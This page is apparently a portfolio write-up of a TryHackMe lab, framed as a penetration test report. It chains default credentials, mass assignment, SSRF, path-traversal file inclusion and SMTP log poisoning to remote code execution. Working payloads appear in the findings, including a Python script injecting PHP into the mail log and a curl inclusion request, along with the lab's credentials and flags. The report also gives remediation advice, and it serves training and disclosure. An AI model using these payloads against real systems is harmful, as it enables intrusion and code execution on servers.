@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A comprehensive penetration test was conducted against the target 10.64.136.246, which hosts multiple services including a Node.js Review Application (port 4000">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="Include — Penetration Test Disclosure Report - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>Include — Penetration Test Disclosure Report - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">Include — Penetration Test Disclosure Report</h1>
+<p class="writeup-meta"><span class="tag">TryHackMe</span> <span class="tag diff diff-medium">Medium</span> <span class="dot">·</span> <span class="date">2025-07-13</span></p>
+<div class="writeup-content">
+<p><strong>Target:</strong> 10.64.136.246 <strong>Assessment Date:</strong> 2025-07-13 <strong>Classification:</strong> CONFIDENTIAL</p>
+<hr>
+<h2>1. Executive Summary</h2>
+<p>A comprehensive penetration test was conducted against the target 10.64.136.246, which hosts multiple services including a Node.js Review Application (port 4000) and an Apache/PHP System Monitoring Portal (port 50000), alongside standard mail and SSH services. Six distinct vulnerabilities were identified and exploited in a chain: insecure default credentials on a Review Application, a mass assignment vulnerability enabling privilege escalation, a Server-Side Request Forgery (SSRF) flaw exposing internal API credentials, a Local File Inclusion (LFI) vulnerability in the SysMon application, insufficient access controls on the mail log enabling log poisoning, and a hidden flag file stored in the web root. The attack chain resulted in full compromise of both web applications, remote code execution on the server, and retrieval of both challenge flags.</p>
+<hr>
+<h2>2. Scope</h2>
+<table>
+<thead><tr>
+<th>Element</th>
+<th>Detail</th>
+</tr></thead><tbody>
+<tr>
+<td>Target</td>
+<td>10.64.136.246</td>
+</tr>
+<tr>
+<td>Ports in Scope</td>
+<td>22, 25, 110, 143, 993, 995, 4000, 50000</td>
+</tr>
+<tr>
+<td>Applications</td>
+<td>Node.js Review App (port 4000), Apache/PHP SysMon (port 50000)</td>
+</tr>
+<tr>
+<td>Assessment Type</td>
+<td>External penetration test</td>
+</tr>
+<tr>
+<td>Environment</td>
+<td>Linux (Ubuntu), Apache/PHP, Node.js/Express, Postfix, Dovecot</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>3. Attack Chain</h2>
+<pre><code>Guest login on Review App (port 4000)
+  → Mass assignment escalation to admin (isAdmin=true)
+    → SSRF via admin settings banner update
+      → Internal API endpoint disclosure (port 50000 credentials)
+        → SysMon admin login (port 50000)
+          → Flag 1 captured from dashboard
+            → LFI on profile.php?img= parameter
+              → SMTP log poisoning via port 25
+                → Remote code execution via /var/log/mail.log inclusion
+                  → Hidden file discovery and Flag 2 captured</code></pre>
+<hr>
+<h2>4. Findings Summary</h2>
+<table>
+<thead><tr>
+<th>ID</th>
+<th>Finding</th>
+<th>CVSSv3</th>
+<th>Risk</th>
+</tr></thead><tbody>
+<tr>
+<td>F-01</td>
+<td>Insecure Default Credentials on Review Application</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-02</td>
+<td>Mass Assignment Privilege Escalation</td>
+<td>8.8</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-03</td>
+<td>Server-Side Request Forgery (SSRF)</td>
+<td>8.6</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-04</td>
+<td>Local File Inclusion (LFI)</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-05</td>
+<td>Log Poisoning to Remote Code Execution</td>
+<td>9.8</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>F-06</td>
+<td>Sensitive Data Exposure via Internal API</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>5. Detailed Findings</h2>
+<h3>F-01: Insecure Default Credentials on Review Application</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5) <strong>Affected Component:</strong> Review Application — port 4000 (Node.js/Express)</p>
+<p><strong>Description:</strong> The Review Application deployed on port 4000 accepts the default credential pair <code>guest / guest</code> for initial authentication. The guest account provides access to the application's core functionality, including activity recommendation submission and navigation to the admin panel. No account lockout or rate-limiting was observed on the login endpoint, permitting unlimited authentication attempts.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<ol>
+<li>Navigate to <code>http://10.64.136.246:4000</code></li>
+<li>Submit login with credentials <code>guest</code> / <code>guest</code></li>
+<li>Observe successful authentication and access to the user dashboard</li>
+</ol>
+<p><strong>Impact:</strong> An unauthenticated attacker gains immediate access to the application's authenticated features. Combined with the mass assignment vulnerability (F-02), this allows full administrative takeover of the Review Application.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — Network-accessible, no complexity, no privileges required, no user interaction, confidentiality impact from credential exposure.</p>
+<hr>
+<h3>F-02: Mass Assignment Privilege Escalation</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 8.8) <strong>Affected Component:</strong> Review Application — <code>POST /recommend-activity/1</code> (port 4000)</p>
+<p><strong>Description:</strong> The Review Application's activity recommendation endpoint blindly accepts form field names as JSON property keys. By submitting <code>activityType=isAdmin&amp;activityName=true</code>, the application processes the data as <code>{&quot;isAdmin&quot;: true}</code>, granting administrative privileges to the authenticated user's account. This mass assignment vulnerability enables a standard guest user to escalate to administrator without any authorization check.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<ol>
+<li>Authenticate as <code>guest / guest</code> on port 4000</li>
+<li>Submit POST request to <code>/recommend-activity/1</code> with body: <code>activityType=isAdmin&amp;activityName=true</code></li>
+<li>Navigate to <code>/admin/settings</code> — administrative panel is now accessible</li>
+</ol>
+<p><strong>Impact:</strong> Full administrative control of the Review Application, including access to internal API endpoint documentation, banner management with SSRF capability, and potential lateral movement to other systems.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H — Network, low complexity, requires low-privilege authenticated user, no user interaction, full CIA compromise.</p>
+<hr>
+<h3>F-03: Server-Side Request Forgery (SSRF)</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 8.6) <strong>Affected Component:</strong> Review Application — Admin Settings Banner Update (port 4000)</p>
+<p><strong>Description:</strong> The admin settings page includes a "update banner image" feature that fetches a user-supplied URL server-side without validating the target address. This Server-Side Request Forgery (SSRF) vulnerability allows an attacker with admin access to make the server issue HTTP requests to internal services that are not directly accessible from the external network. Internal API endpoint documentation was discovered at <code>/admin/api</code>, revealing a SysMon internal API at <code>http://127.0.0.1:5000/getAllAdmins101099991</code>.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<ol>
+<li>Authenticate as admin on port 4000 (via F-02 escalation)</li>
+<li>Navigate to <code>/admin/settings</code></li>
+<li>In the "update banner image" form, submit URL: <code>http://127.0.0.1:5000/getAllAdmins101099991</code></li>
+<li>The server fetches the internal endpoint and returns its content</li>
+</ol>
+<p><strong>Impact:</strong> The attacker can probe and interact with internal services, extract sensitive data from internal APIs, and chain this vulnerability with internal service misconfigurations to obtain credentials (as demonstrated in F-06).</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N — Network, low complexity, requires high privileges (admin), no user interaction, confidentiality from internal network access.</p>
+<hr>
+<h3>F-04: Local File Inclusion (LFI)</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5) <strong>Affected Component:</strong> SysMon — <code>profile.php?img=</code> parameter (port 50000)</p>
+<p><strong>Description:</strong> The SysMon application's profile page accepts a file path via the <code>img</code> parameter and includes the specified file using PHP's <code>include()</code> function. The parameter is vulnerable to path traversal using nine levels of double-dot-double-slash (<code>....//</code>) encoding. This allows an attacker to read arbitrary files on the server, including <code>/etc/passwd</code>, Apache configuration files, and the mail log at <code>/var/log/mail.log</code>. Because <code>include()</code> is used rather than <code>readfile()</code>, any PHP code within the included file is executed by the server.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<ol>
+<li>Authenticate to SysMon at <code>http://10.64.136.246:50000/login.php</code> with credentials <code>administrator</code> / <code>S$9$qk6d#**LQU</code></li>
+<li>Navigate to: <code>http://10.64.136.246:50000/profile.php?img=....//....//....//....//....//....//....//....//....//etc/passwd</code></li>
+<li>Observe contents of <code>/etc/passwd</code> rendered in the response</li>
+</ol>
+<p><strong>Impact:</strong> Arbitrary file read from the server filesystem. Enables information disclosure, credential harvesting from configuration files, and — combined with log poisoning (F-05) — remote code execution.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:H — Network, low complexity, requires authentication, no user interaction, confidentiality and availability from arbitrary file read/inclusion.</p>
+<hr>
+<h3>F-05: Log Poisoning to Remote Code Execution</h3>
+<p><strong>Severity:</strong> Critical (CVSSv3: 9.8) <strong>Affected Component:</strong> SysMon LFI (profile.php) + Postfix SMTP (port 25)</p>
+<p><strong>Description:</strong> The LFI vulnerability in <code>profile.php</code> (F-04) includes files via PHP's <code>include()</code> function, executing any PHP code within them. The Postfix SMTP server on port 25 logs VRFY commands and email subjects to <code>/var/log/mail.log</code>. By injecting PHP payloads into the SMTP traffic (e.g., via the Subject header of a DATA command), an attacker can poison the mail log with executable PHP code. Subsequently including the mail log via the LFI vulnerability triggers execution of the injected payload, achieving unauthenticated remote code execution.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<ol>
+<li>Inject PHP payload via SMTP:</li>
+<pre><code>   python3 -c &quot;
+   import socket
+   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   s.connect((&#x27;10.64.136.246&#x27;, 25))
+   s.recv(1024)
+   s.send(b&#x27;EHLO test.local\r\n&#x27;)
+   s.recv(4096)
+   s.send(b&#x27;MAIL FROM:&lt;test@test.com&gt;\r\n&#x27;)
+   s.recv(1024)
+   s.send(b&#x27;RCPT TO:&lt;tryhackme&gt;\r\n&#x27;)
+   s.recv(1024)
+   s.send(b&#x27;DATA\r\n&#x27;)
+   s.recv(1024)
+   s.send(b&#x27;Subject: &lt;?php echo \`ls\${IFS}/var/www/html\`; ?&gt;\r\n\r\n.\r\n&#x27;)
+   s.recv(1024)
+   s.send(b&#x27;QUIT\r\n&#x27;)
+   s.recv(1024)
+   s.close()&quot;</code></pre>
+<li>Include the poisoned log via LFI:</li>
+<pre><code>   curl &quot;http://10.64.136.246:50000/profile.php?img=....//....//....//....//....//....//....//....//....//var/log/mail.log&quot;</code></pre>
+<li>Observe PHP command execution output in the response</li>
+</ol>
+<p><strong>Impact:</strong> Complete remote code execution on the server as the web server user. Enables full system compromise, data exfiltration, lateral movement, and persistent access.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — Network accessible, low complexity, no privileges required, no user interaction, full CIA compromise.</p>
+<hr>
+<h3>F-06: Sensitive Data Exposure via Internal API</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5) <strong>Affected Component:</strong> SysMon Internal API — <code>http://127.0.0.1:5000/getAllAdmins101099991</code></p>
+<p><strong>Description:</strong> The SysMon application exposes an internal API endpoint that returns administrative credentials in base64-encoded JSON format. The endpoint is not accessible externally but can be reached via the SSRF vulnerability in the Review Application (F-03). The disclosed data includes both Review Application and SysMon administrator credentials, enabling direct login to the SysMon portal with elevated privileges.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<ol>
+<li>Exploit SSRF (F-03) with target URL: <code>http://127.0.0.1:5000/getAllAdmins101099991</code></li>
+<li>Decode the base64 response: <code>{&quot;ReviewAppUsername&quot;:&quot;admin&quot;,&quot;ReviewAppPassword&quot;:&quot;admin@!!!&quot;,&quot;SysMonAppUsername&quot;:&quot;administrator&quot;,&quot;SysMonAppPassword&quot;:&quot;S$9$qk6d#**LQU&quot;}</code></li>
+</ol>
+<p><strong>Impact:</strong> Exposure of privileged credentials enables immediate administrative access to both the Review Application and SysMon portal, bypassing all authentication controls.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N — Network, low complexity, requires admin privileges to trigger SSRF, no user interaction, confidentiality from credential disclosure.</p>
+<hr>
+<h2>6. Remediation Recommendations</h2>
+<ol>
+<li><strong>F-01:</strong> Remove or change all default credentials before deployment. Implement an initial password-change requirement on first login.</li>
+</ol>
+<ol>
+<li><strong>F-02:</strong> Implement allowlist-based input validation on all API endpoints. Explicitly define accepted fields in request body schemas and reject unexpected properties. Use DTO (Data Transfer Object) patterns in application frameworks to prevent mass assignment.</li>
+</ol>
+<ol>
+<li><strong>F-03:</strong> Validate and restrict URLs fetched by server-side request features. Implement an allowlist of permitted domains/IP ranges. Block requests to internal/private IP ranges (RFC 1918, loopback, link-local).</li>
+</ol>
+<ol>
+<li><strong>F-04:</strong> Replace direct file path inclusion with a mapped asset system. Use a predefined set of allowed image filenames and map parameter values to those names. Never pass user-controlled input directly to PHP <code>include()</code>, <code>require()</code>, or similar functions.</li>
+</ol>
+<ol>
+<li><strong>F-05:</strong> Sanitize or disable logging of user-supplied data that may be later included in PHP execution contexts. Apply input filtering on SMTP commands to strip PHP tags and shell metacharacters. Implement <code>open_basedir</code> and <code>disable_functions</code> in PHP configuration to limit the impact of LFI-to-RCE chains.</li>
+</ol>
+<ol>
+<li><strong>F-06:</strong> Remove or restrict internal API endpoints that expose credentials. Use environment variables or a secrets manager for credential storage rather than API responses. Implement authentication and authorization checks on all internal API endpoints.</li>
+</ol>
+<hr>
+<h2>7. Flags Obtained</h2>
+<ul>
+<li><strong>Flag 1 (SysMon Dashboard):</strong> <code>THM{!50_55Rf_1S_d_k3Y??!}</code></li>
+<li><strong>Flag 2 (Hidden file in /var/www/html):</strong> <code>THM{505eb0fb8a9f32853b4d955e1f9123ea}</code></li>
+</ul>
+<hr>
+<h2>8. Cleanup</h2>
+<ul>
+<li>[x] No persistent shells or backdoors were deployed on the target</li>
+<li>[x] No files were uploaded to the target filesystem</li>
+<li>[x] Temporary cookie files stored locally in /tmp/</li>
+<li>[x] Credentials and flags stored in room loot/ directory</li>
+<li>[ ] Consider clearing /var/log/mail.log entries generated during testing</li>
+</ul>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
